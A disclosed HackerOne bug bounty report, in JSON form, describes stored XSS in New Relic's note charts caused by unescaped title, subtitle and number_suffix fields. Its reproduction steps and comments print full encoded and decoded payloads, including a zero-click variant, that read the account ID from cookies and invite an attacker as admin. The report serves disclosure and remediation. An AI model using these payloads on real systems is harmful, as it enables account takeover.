{"id":507132,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDcxMzI=","url":"https://hackerone.com/reports/507132","title":"Stored XSS in notes (charts) because of insecure chart data JSON generation","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-03-09T12:43:35.570Z","submitted_at":"2019-03-09T12:43:35.570Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"skavans","url":"/skavans","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":17011,"url":"https://hackerone.com/newrelic","handle":"newrelic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"New Relic","twitter_handle":"newrelic","website":"https://newrelic.com","about":"New Relic's Coordinated Disclosure Program"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-08-13T13:27:02.333Z","bug_reporter_agreed_on_going_public_at":"2020-08-11T09:35:13.416Z","team_member_agreed_on_going_public_at":"2020-08-13T13:27:02.174Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hey team,\n\nI have discovered vulnerability of chart data JSON generation endpoint (when the chart is displayed inside a note) allowing attacker to inject arbitrary fields into it and leading to stored XSS. The impact is higher than usual here because the payload remains after publishing a note so the XSS is **cross-account**. The payload fires at infected note page after victim clicks a link.\n\n###Proof of Concept\nHere I crafted payload that adds new user with role `Admin` to victim's account. So attacker can publish infected note and every admin/owner clicking the link will invite attacker to his own account with admin privileges.\n{F438182}\n\n###Explanation\nThe vulnerability cause is improper user-input filtration at the chart data JSON generation step. When the user saves some chart to note, the following request is made:\n```http\nPOST /accounts/2260599/notes?agent_id=undefined HTTP/1.1\nHost: rpm.newrelic.com\n\nutf8=%E2%9C%93\u0026authenticity_token=47f2Fr393aG89tWfS4byeeEoXdd09p3y8DtKzlZMXJE%3D\u0026app_name=undefined\u0026note_item%5Bswf%5D=\u0026note_item%5Bbegin_time%5D=2019-03-06T04%3A17%3A33-08%3A00\u0026note_item%5Bend_time%5D=2019-03-06T04%3A27%3A45-08%3A00\u0026note_item%5Btitle%5D=TITLE\u0026note_item%5Bdata_url%5D=%2Fchart_data%2Fmetric_charts%2Fsingle_metric.json%3Faccount_id%3D2260599%26add_to_dashboard%3Dfalse%26agent%3D287785625%26chart_type%3DMSLine%26current_product%3Dapm_product%26format_fn%3Dsmart_round%26hide_legend%3Dfalse%26limit%3D100%26name%3DFunction%2526lt%253Bb%2526gt%253Ba%2526lt%253B%252Fb%2526gt%253B%252F__main__%253AMainHandler.get%26no_click%3Dtrue%26no_links%3Dtrue%26number_suffix%3DUNITS%26render_to%3D45055%26show_events%3Dtrue%26subtitle%3DSUBTITLE%26title%3DTITLE%26tw%255Bdur%255D%3D0.17%26tw%255Bend%255D%3D1551875265%26value%3Dstandard_deviation%26no_click%3D1%26no_links%3D1\u0026note_item%5Bcontext_url%5D=%2Faccounts%2F2260599%2Fcustom_dashboards%2Fpages%2F14736%3Ftw%255Bdur%255D%3D0.17%26tw%255Bend%255D%3D1551875265\u0026note_item%5Bnote_text%5D=\u0026note_action=create\u0026note_id=6075\u0026action_after=save_and_close\n```\nParameter `note_item[data_url]` is URL that contains all information about storing chart: account ID, application ID, etc, as well as chart `title`, `subtitle` and `number_suffix`. As I understand, this URL is parsed at the note saving, and all parameters are stored at DB.\nThen, when a note with stored chart is opened, the Highcharts chart URL at this page is set to something like `https://rpm.newrelic.com/accounts/2260599/notes/6077/items/12992/chart_data`. The endpoint above gets the stored `note_item[data_url]` parameters from DB and generates the chart data JSON, that contains everything is needed to draw the chart.\n\nThe vulnerability itself is that at least `title`, `subtitle` and `number_suffix` parameters are HTML-unescaped before they are injected into resulting JSON. So if some of these parameters contains the `\u0026quot;` the resulting JSON becomes broken, for instance:\n{\"title\": \"\u003ctitle\u003e\"}\nbecomes\n{\"title\": \"**title_with_quot\"**\"}.\n\nThat's the way an attacker can inject arbitrary fields at this JSON.\n\nI am not pretty familiar with the Highcharts JS API but I investigated a little and discovered the `credits` field that is a link with text and href, that can be appended to chart. So in my PoC I injected into chart data JSON some content like the following:\n```json\n{\n  \"credits\": {\n    \"enabled\": true,\n    \"text\": \"click here\",\n    \"href\": \"javascript:alert()\",\n    \"style\": {\n      \"fill\": \"red\"\n    },\n    \"position\": {\n      \"verticalAlign\": \"top\"\n    }\n  }\n}\n```\nThe actual payload is a little more complicated, but this is the main concept.\nIn this way, after the fields are retrieved from DB and the JSON is crafted, the resulting JSON contains an order for Highcharts to draw the credits with malicious link.\n\n###Steps to reproduce:\n1. Sign into New Relic app with some account (attacker)\n2. Save any chart to notes and intercept the saving request using some intercepting proxy tool (e.g. Burp Suite)\n3. Find the parameter `subtitle` inside the data-url parameter `note_item%5Bdata_url%5D` and replace its value with \n```\n%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%33%25%37%32%25%36%35%25%36%34%25%36%39%25%37%34%25%37%33%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%35%25%36%65%25%36%31%25%36%32%25%36%63%25%36%35%25%36%34%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%34%25%37%32%25%37%35%25%36%35%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%38%25%37%32%25%36%35%25%36%36%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%61%25%36%31%25%37%36%25%36%31%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%61%25%37%36%25%36%31%25%37%32%25%32%30%25%36%31%25%36%33%25%36%33%25%36%66%25%37%35%25%36%65%25%37%34%25%35%66%25%36%39%25%36%34%25%33%64%25%36%34%25%36%66%25%36%33%25%37%35%25%36%64%25%36%35%25%36%65%25%37%34%25%32%65%25%36%33%25%36%66%25%36%66%25%36%62%25%36%39%25%36%35%25%32%65%25%36%64%25%36%31%25%37%34%25%36%33%25%36%38%25%32%38%25%32%66%25%36%31%25%36%61%25%37%33%25%35%66%25%36%37%25%37%32%25%36%66%25%37%35%25%37%30%25%35%66%25%36%39%25%36%34%25%33%64%25%32%38%25%35%63%25%36%34%25%32%36%25%32%33%25%37%38%25%33%32%25%36%32%25%33%62%25%32%39%25%32%66%25%32%39%25%35%62%25%33%31%25%35%64%25%33%62%25%37%36%25%36%31%25%37%32%25%32%30%25%37%30%25%36%31%25%37%32%25%36%31%25%36%64%25%37%33%25%33%64%25%37%62%25%36%31%25%36%33%25%36%33%25%36%66%25%37%35%25%36%65%25%37%34%25%35%66%25%37%36%25%36%39%25%36%35%25%37%37%25%33%61%25%37%62%25%37%35%25%37%33%25%36%35%25%37%32%25%33%61%25%37%62%25%36%36%25%37%35%25%36%63%25%36%63%25%35%66%25%36%65%25%36%31%25%36%64%25%36%35%25%33%61%25%32%32%25%34%31%25%35%34%25%35%34%25%34%31%25%34%33%25%34%62%25%34%35%25%35%32%25%32%32%25%32%63%25%36%35%25%36%64%25%36%31%25%36%39%25%36%63%25%33%61%25%32%32%25%36%31%25%37%34%25%37%34%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%30%25%37%33%25%36%62%25%36%31%25%37%36%25%36%31%25%36%65%25%37%33%25%32%65%25%37%32%25%37%35%25%32%32%25%37%64%25%32%63%25%36%63%25%36%35%25%37%36%25%36%35%25%36%63%25%33%61%25%32%32%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%32%25%37%64%25%37%64%25%33%62%25%32%34%25%32%65%25%36%31%25%36%61%25%36%31%25%37%38%25%32%38%25%37%62%25%37%35%25%37%32%25%36%63%25%33%61%25%36%30%25%36%38%25%37%34%25%37%34%25%37%30%25%37%33%25%33%61%25%32%66%25%32%66%25%37%32%25%37%30%25%36%64%25%32%65%25%36%65%25%36%35%25%37%37%25%37%32%25%36%35%25%36%63%25%36%39%25%36%33%25%32%65%25%36%33%25%36%66%25%36%64%25%32%66%25%37%35%25%37%33%25%36%35%25%37%32%25%35%66%25%36%64%25%36%31%25%36%65%25%36%31%25%36%37%25%36%35%25%36%64%25%36%35%25%36%65%25%37%34%25%32%66%25%36%31%25%36%33%25%36%33%25%36%66%25%37%35%25%36%65%25%37%34%25%37%33%25%32%66%25%32%34%25%37%62%25%36%31%25%36%33%25%36%33%25%36%66%25%37%35%25%36%65%25%37%34%25%35%66%25%36%39%25%36%34%25%37%64%25%32%66%25%37%35%25%37%33%25%36%35%25%37%32%25%37%33%25%32%66%25%36%65%25%36%35%25%37%37%25%36%30%25%32%63%25%36%34%25%36%31%25%37%34%25%36%31%25%33%61%25%34%61%25%35%33%25%34%66%25%34%65%25%32%65%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%36%39%25%36%36%25%37%39%25%32%38%25%37%30%25%36%31%25%37%32%25%36%31%25%36%64%25%37%33%25%32%39%25%32%63%25%36%38%25%36%35%25%36%31%25%36%34%25%36%35%25%37%32%25%37%33%25%33%61%25%37%62%25%32%32%25%36%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%37%34%25%37%39%25%37%30%25%36%35%25%32%32%25%33%61%25%32%30%25%32%32%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%36%61%25%37%33%25%36%66%25%36%65%25%32%32%25%37%64%25%32%63%25%37%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%32%25%37%30%25%36%66%25%37%33%25%37%34%25%32%32%25%32%63%25%36%31%25%37%33%25%37%39%25%36%65%25%36%33%25%33%61%25%36%36%25%36%31%25%36%63%25%37%33%25%36%35%25%37%64%25%32%39%25%33%62%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34%25%32%38%25%32%32%25%34%31%25%35%34%25%35%34%25%34%31%25%34%33%25%34%62%25%34%35%25%35%32%25%32%30%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%30%25%37%37%25%36%31%25%37%33%25%32%30%25%36%39%25%36%65%25%37%36%25%36%39%25%37%34%25%36%35%25%36%34%25%32%32%25%32%39%25%33%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%34%25%36%35%25%37%38%25%37%34%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%35%33%25%36%66%25%36%64%25%36%35%25%37%34%25%36%38%25%36%39%25%36%65%25%36%37%25%32%30%25%36%39%25%37%33%25%32%30%25%37%37%25%37%32%25%36%66%25%36%65%25%36%37%25%32%30%25%36%31%25%37%34%25%32%30%25%36%66%25%37%35%25%37%32%25%32%30%25%36%35%25%36%65%25%36%34%25%32%65%25%32%30%25%35%30%25%36%63%25%36%35%25%36%31%25%37%33%25%36%35%25%32%30%25%36%33%25%36%63%25%36%39%25%36%33%25%36%62%25%32%30%25%36%38%25%36%35%25%37%32%25%36%35%25%32%30%25%37%34%25%36%66%25%32%30%25%37%32%25%36%35%25%37%34%25%37%32%25%37%39%25%32%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%33%25%37%34%25%37%39%25%36%63%25%36%35%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%33%25%36%66%25%36%63%25%36%66%25%37%32%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%32%25%36%35%25%36%34%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%36%25%36%66%25%36%65%25%37%34%25%35%33%25%36%39%25%37%61%25%36%35%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%32%25%33%30%25%37%30%25%37%38%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%30%25%36%66%25%37%33%25%36%39%25%37%34%25%36%39%25%36%66%25%36%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%31%25%36%63%25%36%39%25%36%37%25%36%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%36%33%25%36%35%25%36%65%25%37%34%25%36%35%25%37%32%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%36%25%36%35%25%37%32%25%37%34%25%36%39%25%36%33%25%36%31%25%36%63%25%34%31%25%36%63%25%36%39%25%36%37%25%36%65%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%34%25%36%66%25%37%30%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%37%39%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%33%33%25%33%30%25%37%64%25%37%64%25%32%63%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%35%66%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%37%62%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%35%66%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62%25%33%61%25%32%36%25%37%31%25%37%35%25%36%66%25%37%34%25%33%62\n```\nThe double URL encoding is used here because this parameter value is URL inside URL.\n4. Send edited request.\n5. Open the newest note and make sure it contains a red credits link at the top of chart.\n6. Press the link and wait for alert box is popped up.\n7. Go to the users page and make sure there is new admin user \"ATTACKER\" invited.\n\n###Mitigation\n\nYou should properly escape the vulnerable parameters to not give attacker an opportunity to break JSON fields.\n\nPlease reach me if you need some extra information for discovering or mitigating the bug.\n\n## Impact\n\nAttacker can publish infected note and get full access to account of any admin/owner which clicks the vulnerable link.","bounty_amount":"4250.0","formatted_bounty":"$4,250","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":438182,"file_name":"newrelic_stored_xss_charts.mov","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/438/182/80613a4809647f4bd5cc74816e371e4170d3d56b/newrelic_stored_xss_charts.mov?response-content-disposition=attachment%3B%20filename%3D%22newrelic_stored_xss_charts.mov%22%3B%20filename%2A%3DUTF-8%27%27newrelic_stored_xss_charts.mov\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150743Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=507b52d6e081ac0dac2351d901686e5ea1391d3d0c95bc2499b656d4832b7080","file_size":5777063,"type":"video/quicktime"}],"allow_singular_disclosure_at":"2020-09-10T09:35:13.488Z","allow_singular_disclosure_after":-34234349.67261499,"singular_disclosure_allowed":true,"vote_count":144,"voters":["oucast-","wi11","zzero","jensec","msultan","mashoud1122","newbipath12","sameerphad72","spam404","vovohelo","and 134 more..."],"severity":{"rating":"high","score":8.0,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"low","user_interaction":"required","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":18678,"asset_type":"URL","asset_identifier":"rpm.newrelic.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":4291369,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"My current PoC requires victim clicks the link but I'll investigate this a little further to maybe provide the PoC requiring no user-interaction.","automated_response":false,"created_at":"2019-03-09T12:46:11.873Z","updated_at":"2019-03-09T12:46:11.873Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4291410,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If you urldecode the payload I give you above **twice**, you will see it raw:\n```\n\u0026quot;},\u0026quot;credits\u0026quot;:{\u0026quot;enabled\u0026quot;:true,\u0026quot;href\u0026quot;:\u0026quot;javascript:var account_id=document.cookie.match(/ajs_group_id=(\\d\u0026#x2b;)/)[1];var params={account_view:{user:{full_name:\"ATTACKER\",email:\"attacker@skavans.ru\"},level:\"admin\"}};$.ajax({url:`https://rpm.newrelic.com/user_management/accounts/${account_id}/users/new`,data:JSON.stringify(params),headers:{\"content-type\": \"application/json\"},type:\"post\",async:false});alert(\"ATTACKER admin was invited\");\u0026quot;,\u0026quot;text\u0026quot;:\u0026quot;Something is wrong at our end. Please click here to retry.\u0026quot;,\u0026quot;style\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;red\u0026quot;,\u0026quot;fontSize\u0026quot;:\u0026quot;20px\u0026quot;},\u0026quot;position\u0026quot;:{\u0026quot;align\u0026quot;:\u0026quot;center\u0026quot;,\u0026quot;verticalAlign\u0026quot;:\u0026quot;top\u0026quot;,\u0026quot;y\u0026quot;:30}},\u0026quot;_\u0026quot;:{\u0026quot;_\u0026quot;:\u0026quot;\n```","automated_response":false,"created_at":"2019-03-09T13:03:31.352Z","updated_at":"2019-03-09T13:03:31.352Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4294886,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey, I discovered this further and craft a payload needing **no user interaction** at all.\n\nWhen you save chart to note, modify the data_url the following way:\n1. Set `number_suffix` to `%27%76%61%72%20%61%63%63%6f%75%6e%74%5f%69%64%3d%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%2e%6d%61%74%63%68%28%2f%61%6a%73%5f%67%72%6f%75%70%5f%69%64%3d%28%5c%64%2b%29%2f%29%5b%31%5d%3b%76%61%72%20%70%61%72%61%6d%73%3d%7b%61%63%63%6f%75%6e%74%5f%76%69%65%77%3a%7b%75%73%65%72%3a%7b%66%75%6c%6c%5f%6e%61%6d%65%3a%22%41%54%54%41%43%4b%45%52%22%2c%65%6d%61%69%6c%3a%22%61%74%74%61%63%6b%65%72%40%73%6b%61%76%61%6e%73%2e%72%75%22%7d%2c%6c%65%76%65%6c%3a%22%61%64%6d%69%6e%22%7d%7d%3b%24%2e%61%6a%61%78%28%7b%75%72%6c%3a%60%68%74%74%70%73%3a%2f%2f%72%70%6d%2e%6e%65%77%72%65%6c%69%63%2e%63%6f%6d%2f%75%73%65%72%5f%6d%61%6e%61%67%65%6d%65%6e%74%2f%61%63%63%6f%75%6e%74%73%2f%24%7b%61%63%63%6f%75%6e%74%5f%69%64%7d%2f%75%73%65%72%73%2f%6e%65%77%60%2c%64%61%74%61%3a%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%70%61%72%61%6d%73%29%2c%68%65%61%64%65%72%73%3a%7b%22%63%6f%6e%74%65%6e%74%2d%74%79%70%65%22%3a%20%22%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%22%7d%2c%74%79%70%65%3a%22%70%6f%73%74%22%2c%61%73%79%6e%63%3a%66%61%6c%73%65%7d%29%3b%61%6c%65%72%74%28%22%41%54%54%41%43%4b%45%52%20%61%64%6d%69%6e%20%77%61%73%20%69%6e%76%69%74%65%64%22%29%3b%27+\u003cimg/\u003e`\n2. Set `subtitle` to `%26%71%75%6f%74%3b%7d%2c%26%71%75%6f%74%3b%73%65%72%69%65%73%26%71%75%6f%74%3b%3a%5b%7b%26%71%75%6f%74%3b%64%61%74%61%26%71%75%6f%74%3b%3a%5b%7b%26%71%75%6f%74%3b%6e%61%6d%65%26%71%75%6f%74%3b%3a%26%71%75%6f%74%3b%26%71%75%6f%74%3b%2c%26%71%75%6f%74%3b%79%26%71%75%6f%74%3b%3a%32%7d%5d%7d%5d%2c%26%71%75%6f%74%3b%79%41%78%69%73%26%71%75%6f%74%3b%3a%5b%7b%26%71%75%6f%74%3b%74%79%70%65%26%71%75%6f%74%3b%3a%26%71%75%6f%74%3b%63%61%74%65%67%6f%72%79%26%71%75%6f%74%3b%2c%26%71%75%6f%74%3b%63%61%74%65%67%6f%72%69%65%73%26%71%75%6f%74%3b%3a%5b%26%71%75%6f%74%3b%3c%73%76%67%20%6f%6e%6c%6f%61%64%3d%27%2c%27%3e%3c%2f%73%76%67%3e%26%71%75%6f%74%3b%5d%2c%26%71%75%6f%74%3b%6c%61%62%65%6c%73%26%71%75%6f%74%3b%3a%7b%26%71%75%6f%74%3b%65%6e%61%62%6c%65%64%26%71%75%6f%74%3b%3a%74%72%75%65%2c%26%71%75%6f%74%3b%75%73%65%48%54%4d%4c%26%71%75%6f%74%3b%3a%74%72%75%65%7d%7d%5d%2c%26%71%75%6f%74%3b%70%6c%6f%74%4f%70%74%69%6f%6e%73%26%71%75%6f%74%3b%3a%7b%7d%2c%26%71%75%6f%74%3b%78%41%78%69%73%26%71%75%6f%74%3b%3a%7b%7d%7d%3c%2f%73%70%61%6e%3e`\n\nSo I get the following data_url for my account and app:\n`/chart_data/metric_charts/single_metric.json?account_id=2260599\u0026add_to_dashboard=false\u0026agent=287785625\u0026chart_type=StackedArea2D\u0026current_product=apm_product\u0026format_fn=smart_round\u0026hide_legend=false\u0026limit=100\u0026name=Function%2F__main__%3AMainHandler.get\u0026no_click=true\u0026no_links=true\u0026number_suffix=%27%76%61%72%20%61%63%63%6f%75%6e%74%5f%69%64%3d%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%2e%6d%61%74%63%68%28%2f%61%6a%73%5f%67%72%6f%75%70%5f%69%64%3d%28%5c%64%2b%29%2f%29%5b%31%5d%3b%76%61%72%20%70%61%72%61%6d%73%3d%7b%61%63%63%6f%75%6e%74%5f%76%69%65%77%3a%7b%75%73%65%72%3a%7b%66%75%6c%6c%5f%6e%61%6d%65%3a%22%41%54%54%41%43%4b%45%52%22%2c%65%6d%61%69%6c%3a%22%61%74%74%61%63%6b%65%72%40%73%6b%61%76%61%6e%73%2e%72%75%22%7d%2c%6c%65%76%65%6c%3a%22%61%64%6d%69%6e%22%7d%7d%3b%24%2e%61%6a%61%78%28%7b%75%72%6c%3a%60%68%74%74%70%73%3a%2f%2f%72%70%6d%2e%6e%65%77%72%65%6c%69%63%2e%63%6f%6d%2f%75%73%65%72%5f%6d%61%6e%61%67%65%6d%65%6e%74%2f%61%63%63%6f%75%6e%74%73%2f%24%7b%61%63%63%6f%75%6e%74%5f%69%64%7d%2f%75%73%65%72%73%2f%6e%65%77%60%2c%64%61%74%61%3a%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%70%61%72%61%6d%73%29%2c%68%65%61%64%65%72%73%3a%7b%22%63%6f%6e%74%65%6e%74%2d%74%79%70%65%22%3a%20%22%61%70%70%6c%69%63%61%74%69%6f%6e%2f%6a%73%6f%6e%22%7d%2c%74%79%70%65%3a%22%70%6f%73%74%22%2c%61%73%79%6e%63%3a%66%61%6c%73%65%7d%29%3b%61%6c%65%72%74%28%22%41%54%54%41%43%4b%45%52%20%61%64%6d%69%6e%20%77%61%73%20%69%6e%76%69%74%65%64%22%29%3b%27+\u003cimg/\u003e\u0026render_to=45046\u0026show_events=true\u0026subtitle=%26%71%75%6f%74%3b%7d%2c%26%71%75%6f%74%3b%73%65%72%69%65%73%26%71%75%6f%74%3b%3a%5b%7b%26%71%75%6f%74%3b%64%61%74%61%26%71%75%6f%74%3b%3a%5b%7b%26%71%75%6f%74%3b%6e%61%6d%65%26%71%75%6f%74%3b%3a%26%71%75%6f%74%3b%26%71%75%6f%74%3b%2c%26%71%75%6f%74%3b%79%26%71%75%6f%74%3b%3a%32%7d%5d%7d%5d%2c%26%71%75%6f%74%3b%79%41%78%69%73%26%71%75%6f%74%3b%3a%5b%7b%26%71%75%6f%74%3b%74%79%70%65%26%71%75%6f%74%3b%3a%26%71%75%6f%74%3b%63%61%74%65%67%6f%72%79%26%71%75%6f%74%3b%2c%26%71%75%6f%74%3b%63%61%74%65%67%6f%72%69%65%73%26%71%75%6f%74%3b%3a%5b%26%71%75%6f%74%3b%3c%73%76%67%20%6f%6e%6c%6f%61%64%3d%27%2c%27%3e%3c%2f%73%76%67%3e%26%71%75%6f%74%3b%5d%2c%26%71%75%6f%74%3b%6c%61%62%65%6c%73%26%71%75%6f%74%3b%3a%7b%26%71%75%6f%74%3b%65%6e%61%62%6c%65%64%26%71%75%6f%74%3b%3a%74%72%75%65%2c%26%71%75%6f%74%3b%75%73%65%48%54%4d%4c%26%71%75%6f%74%3b%3a%74%72%75%65%7d%7d%5d%2c%26%71%75%6f%74%3b%70%6c%6f%74%4f%7